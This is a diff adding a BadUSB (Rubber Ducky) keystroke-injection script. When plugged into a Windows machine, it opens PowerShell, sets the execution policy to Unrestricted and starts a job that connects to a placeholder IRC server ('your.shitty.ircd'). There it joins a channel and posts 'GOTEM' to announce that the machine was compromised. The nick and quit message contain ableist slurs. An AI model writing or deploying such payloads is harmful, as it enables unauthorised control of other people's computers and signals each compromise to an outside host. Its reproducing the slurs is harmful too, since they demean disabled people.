@@ -1,0 +1,23 @@
+REM Author: wrk (github.com/ayywrk)
+REM Description: Send a PRIVMSG to a specific channel on a specific IRCD (Windows version)
+REM Version: 1.0
+REM Category: GOTEM
+
+REM Open powershell
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell.exe
+DELAY 500
+ENTER
+DELAY 750
+
+DEFAULT_DELAY 50
+STRING cd $env:TEMP
+ENTER
+DELAY 750
+STRING Set-ExecutionPolicy Unrestricted -Scope Process -Confirm:$false
+ENTER
+DELAY 750
+STRING start-job {$n='ownedretard';$t = New-Object System.Net.Sockets.TcpClient('your.shitty.ircd', 6667);$s=$t.GetStream();$w=New-Object System.IO.StreamWriter($s);$w.AutoFlush=$true;$r=New-Object System.IO.StreamReader($s);$w.WriteLine('USER GOTEM 0 * GOTEM');$w.WriteLine('NICK '+$n);for(;;){$l=$r.ReadLine();if($l -clike 'PING *'){$w.WriteLine('PONG '+$l.Substring(5));}if($l -clike '* 001 *'){break;}};$w.WriteLine('JOIN #gotem');$w.WriteLine('PRIVMSG #gotem :GOTEM');$w.WriteLine('QUIT :m a fucking retard');Start-Sleep -Seconds 3;$r.Close();$w.Close();$t.Close();}|Wait-Job|Stop-Job;exit
+ENTER
